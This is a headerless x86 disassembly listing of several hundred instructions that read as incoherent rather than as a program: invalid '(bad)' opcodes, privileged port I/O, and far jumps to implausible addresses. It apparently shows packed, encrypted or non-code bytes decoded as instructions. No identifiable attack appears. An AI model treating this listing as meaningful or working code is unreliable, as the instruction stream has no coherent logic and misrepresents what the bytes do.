  41c32c:	mov    DWORD PTR [ebp-0x2cccb941],edx
  41c332:	mov    ebx,0x989f1f0c
  41c337:	lahf   
  41c338:	xchg   bl,bh
  41c33a:	jp     0x41c31c
  41c33c:	inc    edx
  41c33d:	sub    ch,BYTE PTR [ebp-0x1ff4f320]
  41c343:	mov    ?,eax
  41c345:	pop    ds
  41c346:	cmp    al,0x80
  41c348:	jmp    0x41c316
  41c34a:	std    
  41c34b:	xchg   BYTE PTR [edi-0xf46dc23],ah
  41c351:	in     al,0x4c
  41c353:	fld    TBYTE PTR [edx-0x10]
  41c356:	stos   DWORD PTR es:[edi],eax
  41c357:	ins    DWORD PTR es:[edi],dx
  41c358:	xor    DWORD PTR [ecx],eax
  41c35a:	int3   
  41c35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c35c:	adc    eax,esp
  41c35e:	rol    BYTE PTR [edi+0x3e5314a5],0x53
  41c365:	jno    0x41c386
  41c367:	mov    eax,0x411b09f9
  41c36c:	inc    edx
  41c36d:	pop    ebp
  41c36e:	je     0x41c380
  41c370:	jmp    0x41c3a7
  41c372:	outs   dx,DWORD PTR gs:[esi]
  41c374:	iret   
  41c375:	in     eax,0x5
  41c377:	into   
  41c378:	les    esi,FWORD PTR [eax+0xd]
  41c37b:	mov    cl,0x63
  41c37d:	add    ebx,DWORD PTR [edx]
  41c37f:	jecxz  0x41c34d
  41c381:	int3   
  41c382:	sub    BYTE PTR [eax],bl
  41c384:	arpl   WORD PTR [eax-0x4fbe0bee],ax
  41c38a:	or     al,ch
  41c38c:	gs xchg ebp,edi
  41c38f:	fs ss inc ebx
  41c392:	jb     0x41c3d4
  41c394:	cmp    al,0xba
  41c396:	jno    0x41c3e6
  41c398:	cmc    
  41c399:	pop    ebp
  41c39a:	pop    esp
  41c39b:	pop    eax
  41c39c:	mov    ah,0xe1
  41c39e:	or     esp,DWORD PTR [eax]
  41c3a0:	pop    ebp
  41c3a1:	je     0x41c3a0
  41c3a3:	js     0x41c419
  41c3a5:	sub    ah,BYTE PTR [eax-0xb853784]
  41c3ab:	iret   
  41c3ac:	stc    
  41c3ad:	mov    ch,0x95
  41c3af:	or     eax,DWORD PTR [ebp+0x5c]
  41c3b2:	inc    ebx
  41c3b3:	adc    ch,al
  41c3b5:	shl    DWORD PTR [esi],0xc4
  41c3b8:	js     0x41c433
  41c3ba:	addr16 mov esi,0x9cc7ca46
  41c3c0:	test   al,0xd8
  41c3c2:	jp     0x41c36f
  41c3c4:	lods   eax,DWORD PTR ds:[esi]
  41c3c5:	iret   
  41c3c6:	sbb    eax,0x91c75b45
  41c3cb:	adc    DWORD PTR [esi+eiz*2],ebx
  41c3ce:	xor    ch,dl
  41c3d0:	mov    ecx,0x90fd25ac
  41c3d5:	sub    DWORD PTR [edx],0xffffffb0
  41c3d8:	not    BYTE PTR [di+0x11f1]
  41c3dd:	fisubr DWORD PTR [ebx-0x5b]
  41c3e0:	dec    ecx
  41c3e1:	push   ds
  41c3e2:	add    al,0x6a
  41c3e4:	sbb    esp,DWORD PTR [ecx-0x487ad385]
  41c3ea:	or     ch,ah
  41c3ec:	out    dx,al
  41c3ed:	pop    ds
  41c3ee:	dec    BYTE PTR [ebx]
  41c3f0:	test   DWORD PTR [ebx+0x4fc67217],ebp
  41c3f6:	mov    ebp,0x8c9e1432
  41c3fb:	push   eax
  41c3fc:	lods   al,BYTE PTR ds:[esi]
  41c3fd:	push   es
  41c3fe:	jo     0x41c3b3
  41c400:	mov    DWORD PTR [ecx+ebp*1+0x32ebaadc],ecx
  41c407:	ret    
  41c408:	imul   ebp,DWORD PTR [edx-0x4c2df1db],0x258548a3
  41c412:	mov    ds:0xec6ac0af,al
  41c417:	and    eax,DWORD PTR [edi]
  41c419:	push   cs
  41c41a:	js     0x41c485
  41c41c:	test   DWORD PTR [eax-0x61],ebx
  41c41f:	lahf   
  41c420:	jmp    0x41c3c0
  41c422:	push   cs
  41c423:	dec    esi
  41c424:	popa   
  41c425:	retf   
  41c426:	adc    ebp,DWORD PTR [ebx+0x778b0137]
  41c42c:	xchg   ecx,eax
  41c42d:	fadd   st(4),st
  41c42f:	lods   eax,DWORD PTR ds:[esi]
  41c430:	mov    al,0xbc
  41c432:	cld    
  41c433:	xchg   DWORD PTR [ecx],edi
  41c435:	call   0x1da74994
  41c43a:	movaps xmm3,XMMWORD PTR ds:0xbad3500d
  41c441:	add    esi,DWORD PTR [esi-0x18bfa92d]
  41c447:	and    BYTE PTR fs:[ecx+0x7cd0f738],0xb1
  41c44f:	adc    al,0x90
  41c451:	je     0x41c4cd
  41c453:	pop    esp
  41c454:	loope  0x41c410
  41c456:	(bad)  
  41c457:	(bad)  
  41c458:	outs   dx,BYTE PTR ds:[esi]
  41c459:	push   esp
  41c45a:	jae    0x41c431
  41c45c:	and    cl,BYTE PTR [ebx+0x69]
  41c45f:	shl    DWORD PTR [ebx],1
  41c461:	jmp    0x41c447
  41c463:	adc    bh,BYTE PTR [ecx+0x37f62eaa]
  41c469:	lock ins BYTE PTR es:[edi],dx
  41c46b:	iret   
  41c46c:	jb     0x41c418
  41c46e:	retf   
  41c46f:	out    dx,al
  41c470:	call   0x17d69
  41c475:	retf   0x3f73
  41c478:	jge    0x41c41f
  41c47a:	push   ecx
  41c47b:	into   
  41c47c:	popf   
  41c47d:	jae    0x41c46f
  41c47f:	(bad)
  41c483:	pushf  
  41c484:	mov    ah,0x2b
  41c486:	push   esp
  41c487:	xor    BYTE PTR [ebp+0x5d59001f],0x59
  41c48e:	out    dx,eax
  41c48f:	or     al,BYTE PTR [eax-0x7aefa730]
  41c495:	jg     0x41c4aa
  41c497:	js     0x41c495
  41c499:	test   al,0xf0
  41c49b:	pop    ebx
  41c49c:	inc    esp
  41c49d:	sahf   
  41c49e:	mov    ds:0x70714799,al
  41c4a3:	push   ebx
  41c4a4:	cmp    DWORD PTR [edx+0x491e5732],0x0
  41c4ab:	scas   al,BYTE PTR es:[edi]
  41c4ac:	jle    0x41c474
  41c4ae:	std    
  41c4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4b0:	rcr    ebp,cl
  41c4b2:	pop    esp
  41c4b3:	rol    DWORD PTR [esi-0x4e],1
  41c4b6:	es test eax,0xa637d021
  41c4bc:	mov    bh,0xa6
  41c4be:	(bad)
  41c4c1:	push   ebp
  41c4c2:	mov    ah,ah
  41c4c4:	sub    DWORD PTR [ecx+esi*4+0x3c],esi
  41c4c8:	pop    esp
  41c4c9:	xor    DWORD PTR [ebp-0x7d],ebp
  41c4cc:	sub    eax,0x56c9dfa4
  41c4d1:	jnp    0x41c541
  41c4d3:	(bad)  
  41c4d4:	dec    ecx
  41c4d5:	sub    al,0xc6
  41c4d7:	out    dx,al
  41c4d8:	fs loopne 0x41c46e
  41c4db:	rcr    ebp,1
  41c4dd:	cmp    BYTE PTR [ecx],ah
  41c4df:	(bad)  
  41c4e0:	cli    
  41c4e1:	mov    dl,0x95
  41c4e3:	popa   
  41c4e4:	jge    0x41c511
  41c4e6:	ss push ebp
  41c4e8:	clc    
  41c4e9:	sub    eax,0x3bc6d655
  41c4ee:	shl    BYTE PTR [eax-0x499dcc1d],0xc1
  41c4f5:	dec    ebx
  41c4f6:	out    0xa7,eax
  41c4f8:	push   0x472e613a
  41c4fd:	test   eax,0x5cc436fd
  41c502:	je     0x41c4ca
  41c504:	iret   
  41c505:	mov    ebp,0x8751896e
  41c50a:	imul   ebp,DWORD PTR [ecx],0x44
  41c50d:	or     bh,BYTE PTR [edi+0x6b]
  41c510:	push   eax
  41c511:	jo     0x41c498
  41c513:	lea    edx,[ebp-0x3f44fca1]
  41c519:	push   es
  41c51a:	add    BYTE PTR [ebx+0x43],bl
  41c51d:	out    0x52,al
  41c51f:	jae    0x41c4f9
  41c521:	into   
  41c522:	icebp  
  41c523:	pop    ecx
  41c524:	dec    eax
  41c525:	jo     0x41c4f0
  41c527:	in     eax,dx
  41c528:	retf   
  41c529:	int    0x2e
  41c52b:	aam    0xde
  41c52d:	popa   
  41c52e:	retf   
  41c52f:	ror    BYTE PTR [ebp+0x22],1
  41c532:	and    edx,edx
  41c534:	cmp    DWORD PTR [ecx],edx
  41c536:	mov    BYTE PTR [eax-0x7f98f744],cl
  41c53c:	lods   al,BYTE PTR ds:[esi]
  41c53d:	mov    ds:0x250c2d4d,al
  41c542:	inc    edx
  41c543:	and    al,0xc0
  41c546:	je     0x41c579
  41c548:	ret    0x970e
  41c54b:	loopne 0x41c4ec
  41c54d:	test   eax,0x86881c2b
  41c552:	retw   0xd30c
  41c556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c557:	inc    ecx
  41c558:	hlt    
  41c559:	cmp    ah,BYTE PTR [ebx]
  41c55b:	inc    ebx
  41c55c:	sbb    DWORD PTR [edx-0x2ed80861],eax
  41c562:	pop    es
  41c563:	retf   0x525b
  41c566:	and    al,0xa
  41c568:	repnz mov WORD PTR [ecx-0x6264d7d3],ds
  41c56f:	sbb    BYTE PTR [edi],dh
  41c571:	enter  0x9df0,0xb8
  41c575:	aaa    
  41c576:	pop    edx
  41c577:	comiss xmm7,DWORD PTR [ebx+0x72]
  41c57b:	jmp    0x41c5a6
  41c57d:	call   0xcb9ede92
  41c582:	rol    al,0xf2
  41c585:	outs   dx,DWORD PTR ds:[esi]
  41c586:	dec    ebx
  41c587:	das    
  41c588:	repz pop edx
  41c58a:	test   DWORD PTR [ebx-0x50],ebp
  41c58d:	pop    esp
  41c58e:	and    BYTE PTR [esi+0xb],al
  41c591:	or     DWORD PTR [ebp-0x191997d9],ecx
  41c597:	jl     0x41c58f
  41c599:	rol    BYTE PTR [ebx],cl
  41c59b:	jae    0x41c582
  41c59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c59e:	jbe    0x41c595
  41c5a0:	inc    esi
  41c5a1:	jl     0x41c5b2
  41c5a3:	call   0x5ba93c5
  41c5a8:	leave  
  41c5a9:	out    0x92,eax
  41c5ab:	pop    es
  41c5ac:	shl    al,1
  41c5ae:	(bad)  
  41c5af:	in     eax,dx
  41c5b0:	jb     0x41c626
  41c5b2:	cli    
  41c5b3:	push   esi
  41c5b4:	rcl    bh,1
  41c5b6:	jns    0x41c549
  41c5b8:	leave  
  41c5b9:	pop    edx
  41c5ba:	cs mov ebx,0x21f9756
  41c5c0:	or     DWORD PTR [edi-0x580cbd55],esi
  41c5c6:	arpl   sp,sp
  41c5c8:	xor    ecx,DWORD PTR [edi-0x30]
  41c5cb:	mov    bh,0xd8
  41c5cd:	ror    DWORD PTR [esi+0x492fc83d],cl
  41c5d3:	or     eax,0xd3f362e4
  41c5d8:	into   
  41c5d9:	xchg   esi,eax
  41c5da:	adc    DWORD PTR [ecx-0x7037fc07],ecx
  41c5e0:	scas   eax,DWORD PTR es:[edi]
  41c5e1:	les    eax,FWORD PTR [eax+0x7e]
  41c5e4:	sbb    dh,dh
  41c5e6:	test   DWORD PTR [ebx],0xe5e660ef
  41c5ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ed:	retf   0x2d12
  41c5f0:	mov    bl,cl
  41c5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5f3:	or     al,0xd2
  41c5f5:	and    BYTE PTR ss:[esi],cl
  41c5f8:	ja     0x41c615
  41c5fa:	and    al,0xf9
  41c5fc:	ins    BYTE PTR es:[edi],dx
  41c5fd:	push   es
  41c5fe:	mov    ebp,DWORD PTR [esi-0x70c396d7]
  41c604:	pop    edx
  41c605:	xor    eax,0x489a4851
  41c60a:	xchg   edi,eax
  41c60b:	cs popa 
  41c60d:	arpl   WORD PTR [edi-0x16],si
  41c610:	shl    DWORD PTR [esi+0x5e],1
  41c613:	sti    
  41c614:	in     eax,0xb
  41c616:	mov    WORD PTR [esi+esi*8],ds
  41c619:	xchg   ebp,eax
  41c61a:	mov    ds:0x9d30fda3,eax
  41c61f:	cmp    edx,DWORD PTR [edx+eiz*2+0x16f9bec7]
  41c626:	daa    
  41c627:	mov    ecx,0xe889e043
  41c62c:	xor    dl,BYTE PTR [eax]
  41c62e:	push   edi
  41c62f:	mov    es,ecx
  41c631:	(bad)  
  41c632:	leave  
  41c633:	xchg   edx,eax
  41c634:	in     al,dx
  41c635:	or     edi,eax
  41c637:	adc    cl,BYTE PTR fs:[edi+0x151e3d41]
  41c63e:	repz pop es
  41c640:	xchg   esp,eax
  41c641:	sub    ebx,0x6de12856
  41c647:	mov    dh,BYTE PTR [ecx+0x27]
  41c64a:	aaa    
  41c64b:	jns    0x41c68f
  41c64d:	jmp    0x4e30f251
  41c652:	xor    bh,BYTE PTR [edx]
  41c654:	add    eax,0x221540a
  41c659:	in     al,0xa7
  41c65b:	jl     0x41c68d
  41c65d:	jp     0x41c6b2
  41c65f:	jnp    0x41c648
  41c661:	in     eax,0x27
  41c663:	arpl   WORD PTR [edx],bx
  41c665:	in     eax,dx
  41c666:	popf   
  41c667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c668:	shl    esp,1
  41c66a:	mov    al,ds:0x53780b90
  41c66f:	inc    ecx
  41c670:	sbb    eax,0x73a136b
  41c675:	addr16 call 0xadb:0x37ce11d8
  41c67d:	adc    al,0x68
  41c67f:	xchg   esp,eax
  41c680:	sbb    DWORD PTR [ebp+0x58e64929],ebp
  41c686:	arpl   WORD PTR [esi],si
  41c688:	ja     0x41c694
  41c68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c68b:	dec    esi
  41c68c:	dec    esi
  41c68d:	stos   DWORD PTR es:[edi],eax
  41c68e:	cwde   
  41c68f:	pop    eax
  41c690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c691:	adc    DWORD PTR [ebp-0x41cbdd6],edi
  41c697:	add    ebp,DWORD PTR [edi+0x74]
  41c69a:	or     dl,BYTE PTR ds:[ebx+0x15]
  41c69e:	inc    ebp
  41c69f:	mov    cs,WORD PTR [eax+0xb018ced]
  41c6a5:	call   0xfd15:0xb7b86319
  41c6ac:	and    DWORD PTR [edx+0x64],esi
  41c6af:	mov    al,ds:0x9f65e393
  41c6b4:	and    DWORD PTR [edi+ecx*4+0x7d8696a3],0xffffffcf
  41c6bc:	lods   al,BYTE PTR ds:[esi]
  41c6bd:	mov    al,ah
  41c6bf:	rcl    DWORD PTR [ebp-0x41],0xe8
  41c6c3:	push   ss
  41c6c4:	sbb    DWORD PTR [ebx-0x38],edi
  41c6c7:	mov    edi,0x68af286b
  41c6cc:	jl     0x41c64f
  41c6ce:	inc    ebp
  41c6cf:	push   edi
  41c6d0:	test   DWORD PTR [eax],0x564837bf
  41c6d6:	xor    DWORD PTR [edi-0xee876ff],ecx
  41c6dc:	xor    al,0xf0
  41c6de:	addr16 das 
  41c6e0:	sbb    ch,BYTE PTR [edx]
  41c6e2:	xchg   esp,eax
  41c6e3:	inc    edi
  41c6e4:	xor    dl,BYTE PTR [edx-0x3f2f97a4]
  41c6ea:	mov    dl,0x3a
  41c6ec:	les    edi,FWORD PTR [eax]
  41c6ee:	xchg   edi,eax
  41c6ef:	sbb    dh,BYTE PTR [esi+0x3bc45c6a]
  41c6f5:	xchg   BYTE PTR [edx+edx*4+0x18],ah
  41c6f9:	out    0x84,al
  41c6fb:	lods   al,BYTE PTR ds:[esi]
  41c6fc:	cld    
  41c6fd:	mov    cl,0xe4
  41c6ff:	rcl    BYTE PTR [ebx+0x18fdd668],cl
  41c705:	dec    eax
  41c706:	inc    esp
  41c707:	jl     0x41c6c5
  41c709:	inc    edx
  41c70a:	or     esp,edx
  41c70c:	or     esi,ebx
  41c70e:	fwait
  41c70f:	cli    
  41c710:	jnp    0x41c767
  41c712:	in     eax,0xa6
  41c714:	ja     0x41c759
  41c716:	das    
  41c717:	(bad)  
  41c718:	mov    eax,0x111090e2
  41c71d:	fild   DWORD PTR [esi+eiz*2-0x16]
  41c721:	sbb    al,0x94
  41c723:	cwde   
  41c724:	mov    eax,ds:0x871cfd60
  41c729:	sub    DWORD PTR [edi+ebp*8-0x39],0x9e0b72be
  41c731:	hlt    
  41c732:	jnp    0x41c764
  41c734:	daa    
  41c735:	add    eax,0x39d60209
  41c73a:	xchg   esp,eax
  41c73b:	sbb    DWORD PTR [eax],edi
  41c73d:	ret    0xa61b
  41c740:	jno    0x41c703
  41c742:	mov    BYTE PTR [ecx-0x6c],bl
  41c745:	jae    0x41c76b
  41c747:	jae    0x41c787
  41c749:	jg     0x41c6fe
  41c74b:	xchg   ecx,eax
  41c74c:	and    ah,cl
  41c74e:	push   edi
  41c74f:	xchg   ebp,eax
  41c750:	xor    edx,DWORD PTR [eax]
  41c752:	pop    ds
  41c753:	push   es
  41c754:	pop    edx
  41c755:	bound  ebp,QWORD PTR [edi]
  41c757:	mov    dl,0x4e
  41c759:	jns    0x41c768
  41c75b:	pop    ebp
  41c75c:	pushf  
  41c75d:	int    0xf4
  41c75f:	fimul  DWORD PTR [edi-0x49]
  41c762:	push   eax
  41c763:	pop    ebp
  41c764:	or     al,0xc4
  41c766:	xchg   edx,eax
  41c767:	ret    0x1b3b
  41c76a:	loopne 0x41c709
  41c76c:	xchg   edi,eax
  41c76d:	and    bh,BYTE PTR [edi-0x3b]
  41c770:	in     al,dx
  41c771:	mov    ?,WORD PTR [ebx-0x51]
  41c774:	mov    WORD PTR [eax+0x78],?
  41c777:	or     eax,0x5c121142
  41c77c:	js     0x41c7c3
  41c77e:	(bad)  
  41c77f:	test   BYTE PTR [ebx+0x42],0x10
  41c783:	addr16 retf 
  41c785:	fcom   QWORD PTR [esi-0x6aa34e0b]
  41c78b:	(bad)  
  41c78c:	jg     0x41c76f
  41c78e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c78f:	adc    al,0x48
  41c791:	loopne 0x41c74c
  41c793:	enter  0xa05a,0xb6
  41c797:	mov    eax,0xc9a7a3a4
  41c79c:	pop    esp
  41c79d:	xor    eax,0x590ef753
  41c7a2:	jmp    0x41c7f6
  41c7a4:	xchg   ecx,eax
  41c7a5:	add    BYTE PTR [eax-0x206f1a5c],ah
  41c7ab:	mov    ah,0xe7
  41c7ad:	inc    edx
  41c7ae:	lds    edx,FWORD PTR [edx+0x141fee89]
  41c7b4:	mov    edx,0x46d2cfa
  41c7b9:	add    eax,0x50f7a399
  41c7be:	fwait
  41c7bf:	sahf   
  41c7c0:	sbb    ebp,DWORD PTR [edx+0x1e432535]
  41c7c6:	mov    cl,0x42
  41c7c8:	push   edi
  41c7c9:	sub    BYTE PTR [eax+0x5a],ah
  41c7cc:	movaps xmm0,XMMWORD PTR [ebx]
  41c7cf:	mov    al,0xa7
  41c7d1:	scas   eax,DWORD PTR es:[edi]
  41c7d2:	call   0x6ebf2a2f
  41c7d7:	xchg   ebx,esi
  41c7d9:	jmp    0xb2e35f2
  41c7de:	sub    al,0x31
  41c7e0:	fs xchg edx,eax
  41c7e2:	pop    edx
  41c7e3:	jno    0x41c819
  41c7e5:	pop    edx
  41c7e6:	dec    ebx
  41c7e7:	xchg   esi,eax
  41c7e8:	pop    esi
  41c7e9:	sub    al,0xa8
  41c7eb:	sub    ebx,DWORD PTR [ebp+0x37]
  41c7ee:	xor    dl,0xbf
  41c7f1:	gs ret 0xba49
  41c7f5:	pop    es
  41c7f6:	les    edi,FWORD PTR [esi+0x24f50ee5]
  41c7fc:	push   0x8bfe57f7
  41c801:	nop
  41c802:	mov    esi,0x3d69f019
  41c807:	inc    edx
  41c808:	mov    ecx,0x54cb38fa
  41c80d:	pop    edi
  41c80e:	sti    
  41c80f:	leave  
  41c810:	lds    edx,FWORD PTR [edi]
  41c812:	jge    0x41c7d2
  41c814:	adc    ah,0x84
  41c817:	mov    edi,0xd4eb6d9b
  41c81c:	xchg   esi,eax
  41c81d:	cwde   
  41c81e:	sub    ebp,ebp
  41c820:	popa   
  41c821:	cmp    eax,DWORD PTR [eax+0x17]
  41c824:	imul   DWORD PTR [ebx+eiz*4]
  41c827:	int    0xd1
  41c829:	mov    ah,BYTE PTR [edx+0x607d99a4]
  41c82f:	push   cs
  41c830:	(bad)  
  41c831:	shl    bh,cl
  41c833:	jns    0x41c807
  41c835:	repnz add cl,BYTE PTR [ebx-0x20471832]
  41c83c:	retf   0x7e2
  41c83f:	sbb    ebp,eax
  41c841:	rol    edi,0x52
  41c844:	(bad)
  41c848:	sbb    BYTE PTR [ebp+0xa0b5e8b],dh
  41c84e:	data16 adc BYTE PTR [ecx],al
  41c851:	mov    ebp,0x4ccc2f7c
  41c856:	xchg   ecx,eax
  41c857:	or     DWORD PTR [edx+0x27],edi
  41c85a:	dec    ebp
  41c85b:	test   dl,0x8b
  41c85e:	mov    ebx,0x3585d967
  41c863:	dec    edx
  41c864:	sub    ah,BYTE PTR [eax+0x3457fa1c]
  41c86a:	or     ebp,esp
  41c86c:	dec    esp
  41c86d:	jl     0x41c803
  41c86f:	mov    al,0xf
  41c871:	shl    DWORD PTR [ecx+0x3c63bd94],cl
  41c877:	or     DWORD PTR [ecx+0x61],esi
  41c87a:	pop    es
  41c87b:	cdq    
  41c87c:	xchg   ebx,eax
  41c87d:	ins    DWORD PTR es:[edi],dx
  41c87e:	mov    bh,0x5a
  41c880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c881:	sbb    DWORD PTR [esi+0x32],esi
  41c884:	xchg   ecx,eax
  41c885:	mov    edi,0xf4a22e45
  41c88a:	dec    edi
  41c88b:	imul   ebx,ecx,0x11
  41c88e:	cli    
  41c88f:	mov    ds:0x33ca0351,al
  41c894:	inc    ebx
  41c895:	mov    edx,0x9537ec55
  41c89a:	fdivp  st(4),st
  41c89c:	sub    al,0xff
  41c89e:	les    eax,FWORD PTR [esi]
  41c8a0:	xor    dl,BYTE PTR [ecx-0x64]
  41c8a3:	shl    DWORD PTR [ecx],cl
  41c8a5:	mov    BYTE PTR [edi+0x9],0xc3
  41c8a9:	fcmovnbe st,st(4)
  41c8ab:	xchg   esp,eax
  41c8ac:	xchg   DWORD PTR [edx+0x439989cf],ebx
  41c8b2:	aam    0xfe
  41c8b4:	jo     0x41c874
  41c8b6:	add    eax,0x3e363f54
  41c8bb:	loopne 0x41c8e1
  41c8bd:	in     eax,0x4
  41c8bf:	mov    ah,BYTE PTR [edx]
  41c8c1:	fisub  WORD PTR [esi+0x2a]
  41c8c4:	xchg   esi,eax
  41c8c5:	mov    edi,0x68fde857
  41c8ca:	adc    BYTE PTR [esi-0x76],0xfb
  41c8ce:	cmp    BYTE PTR [edx-0x5a],0x29
  41c8d2:	xchg   edi,eax
  41c8d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8d4:	pop    esi
  41c8d5:	adc    esi,DWORD PTR [esi-0x77]
  41c8d8:	adc    DWORD PTR [eax-0x1e6e38ea],eax
  41c8de:	add    eax,0xc0946f08
  41c8e3:	jb     0x41c8bb
  41c8e5:	cwde   
  41c8e6:	cmp    al,0xb1
  41c8e8:	out    0xe4,al
  41c8ea:	test   eax,0x5abb1851
  41c8ef:	jg     0x41c906
  41c8f1:	in     eax,0x3f
  41c8f3:	dec    esi
  41c8f4:	jnp    0x41c8d3
  41c8f6:	repnz scas eax,DWORD PTR es:[edi]
  41c8f8:	mov    eax,ds:0x8ebf8e44
  41c8fd:	repz dec esp
  41c8ff:	ins    BYTE PTR es:[edi],dx
  41c900:	inc    esi
  41c901:	fmulp  st(7),st
  41c903:	sahf   
  41c904:	shr    BYTE PTR [ebx],1
  41c906:	ret    0x7386
  41c909:	mov    ds:0xda536374,eax
  41c90e:	dec    BYTE PTR [edx]
  41c910:	or     edx,DWORD PTR [edi]
  41c912:	xchg   ebx,eax
  41c913:	dec    ebp
  41c914:	fwait
  41c915:	adc    al,0x5b
  41c917:	daa    
  41c918:	iret   
  41c919:	dec    ecx
  41c91a:	xchg   edi,eax
  41c91b:	clc    
  41c91c:	jb     0x41c8e8
  41c91e:	pop    esp
  41c91f:	out    0x2f,al
  41c921:	(bad)  
  41c922:	loopne 0x41c8c4
  41c924:	and    eax,0x6cc5d2e7
  41c929:	push   edi
  41c92a:	dec    ecx
  41c92b:	dec    ebx
  41c92c:	test   eax,0x56797294
  41c931:	stos   BYTE PTR es:[edi],al
  41c932:	jo     0x41c91a
  41c934:	loop   0x41c8dc
  41c936:	mov    al,0xfa
  41c938:	xchg   ecx,eax
  41c939:	sbb    dh,ah
  41c93b:	shr    BYTE PTR ds:0xd942b5b5,1
  41c941:	arpl   WORD PTR [ecx],cx
  41c943:	adc    bh,BYTE PTR [ebx+0x75]
  41c946:	cdq    
  41c947:	daa    
  41c948:	and    eax,0x32888c6a
  41c94d:	jle    0x41c8e7
  41c94f:	mov    esp,0x6ce7c9f
  41c954:	out    dx,eax
  41c955:	adc    esp,0xffffff8c
  41c958:	mov    ss,WORD PTR [esp+eax*4+0x7a79cbfe]
  41c95f:	xor    ch,dl
  41c961:	mov    cl,dh
  41c963:	aaa    
  41c964:	stos   BYTE PTR es:[edi],al
  41c965:	cli    
  41c966:	pop    ss
  41c967:	pop    edx
  41c968:	push   ebp
  41c969:	clc    
  41c96a:	fnstcw WORD PTR [esp+ebx*4+0x3e]
  41c96e:	push   ebx
  41c96f:	test   DWORD PTR [ebp+ecx*4+0x75],esi
  41c973:	jo     0x41c900
  41c975:	push   ss
  41c976:	dec    edi
  41c977:	pop    edi
  41c978:	call   0xc661c41a
  41c97d:	push   esi
  41c97e:	fmul   st(4),st
  41c980:	and    al,0xbf
  41c982:	mov    fs,WORD PTR [ecx+0x115fdd57]
  41c988:	sbb    BYTE PTR [ecx],al
  41c98a:	gs jmp 0xb7f0:0x24123543
  41c992:	adc    al,0x47
  41c994:	jbe    0x41c934
  41c996:	push   edx
  41c997:	xchg   DWORD PTR [eax+0x1644f10],esi
  41c99d:	mov    ebp,0x7d64fa95
  41c9a2:	or     ah,BYTE PTR [esi+edx*4-0x36]
  41c9a6:	add    bh,BYTE PTR [ebp+0x2fde7937]
  41c9ac:	cmp    esi,0x2355a41d
  41c9b2:	ror    BYTE PTR [ecx],cl
  41c9b4:	fist   WORD PTR [edx-0x14]
  41c9b7:	mov    BYTE PTR [ebx-0xf27be5e],bh
  41c9bd:	dec    ebx
  41c9be:	jo     0x41ca2a
  41c9c0:	fld    QWORD PTR [ebx-0xc]
  41c9c3:	cs retf 
  41c9c5:	mov    bl,0xec
  41c9c7:	or     al,0x77
  41c9c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ca:	push   esp
  41c9cb:	sbb    di,si
  41c9ce:	clc    
  41c9cf:	lea    edi,[edi]
  41c9d1:	pushf  
  41c9d2:	ins    DWORD PTR es:[edi],dx
  41c9d3:	jl     0x41c98f
  41c9d5:	xchg   esp,eax
  41c9d6:	ds pop ss
  41c9d8:	pop    ebp
  41c9d9:	pushf  
  41c9da:	cs inc eax
  41c9dc:	fwait
  41c9dd:	sbb    BYTE PTR [edi],ch
  41c9df:	push   esi
  41c9e0:	push   edi
  41c9e1:	and    ecx,edi
  41c9e3:	lock inc eax
  41c9e5:	lea    ebx,[edi+0x79]
  41c9e8:	jle    0x41c9d4
  41c9ea:	bound  ecx,QWORD PTR gs:[ecx-0x18]
  41c9ee:	jnp    0x41c9a8
  41c9f0:	pusha  
  41c9f1:	push   esp
  41c9f2:	call   0x8b370175
  41c9f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9f8:	pop    ebp
  41c9f9:	xor    ebp,ecx
  41c9fb:	jge    0x41ca5b
  41c9fd:	mov    al,0x43
  41c9ff:	enter  0xbe9b,0x6a
  41ca03:	inc    esi
  41ca04:	(bad)  
  41ca05:	jl     0x41ca00
  41ca07:	rcl    BYTE PTR [edi-0x2cda5934],0xf3
  41ca0e:	bnd jl 0x41ca6e
  41ca11:	in     al,dx
  41ca12:	pop    ds
  41ca13:	ja     0x41c9ad
  41ca15:	add    BYTE PTR [ebp+0x7d3c6e],ch
  41ca1b:	push   ss
  41ca1c:	sbb    edi,ebp
  41ca1e:	cld    
  41ca1f:	dec    eax
  41ca20:	cli    
  41ca21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca22:	or     cl,dl
  41ca24:	aas    
  41ca25:	ds je  0x41ca81
  41ca28:	repz mov edx,0xef56e351
  41ca2e:	or     BYTE PTR [esi+0x711704a8],cl
  41ca34:	sahf   
  41ca35:	fs and eax,0xe48bdf92
  41ca3b:	repz scas eax,DWORD PTR es:[edi]
  41ca3d:	or     BYTE PTR [ecx+eiz*2-0x4e],bl
  41ca41:	push   ss
  41ca42:	mov    esp,DWORD PTR [esi]
  41ca44:	mov    cl,0x11
  41ca46:	(bad)  
  41ca47:	cmp    DWORD PTR [ecx],edi
  41ca49:	aad    0x9b
  41ca4b:	pmullw mm0,mm5
  41ca4e:	dec    edi
  41ca4f:	repz dec esi
  41ca51:	sti    
  41ca52:	or     al,dl
  41ca54:	mov    ebx,0x9ada59f6
  41ca59:	sub    DWORD PTR [esi-0x65],ecx
  41ca5c:	sub    bh,BYTE PTR [ebx+0x63388142]
  41ca62:	dec    esi
  41ca63:	push   ebx
  41ca64:	shl    BYTE PTR [ebp-0x55],1
  41ca67:	mov    ebp,0xdfbf4981
  41ca6c:	jmp    0x4a61:0xa9d68525
  41ca73:	pop    esp
  41ca74:	sbb    ebp,ebp
  41ca76:	sub    dh,cl
  41ca78:	cmp    dl,0xe2
  41ca7b:	and    esi,esi
  41ca7d:	pop    edx
  41ca7e:	aas    
  41ca7f:	cwde   
  41ca80:	mov    esi,0xba2ca868
  41ca85:	fucomip st,st(6)
  41ca87:	jne    0x41caca
  41ca89:	nop
  41ca8a:	inc    esp
  41ca8b:	add    al,0x5
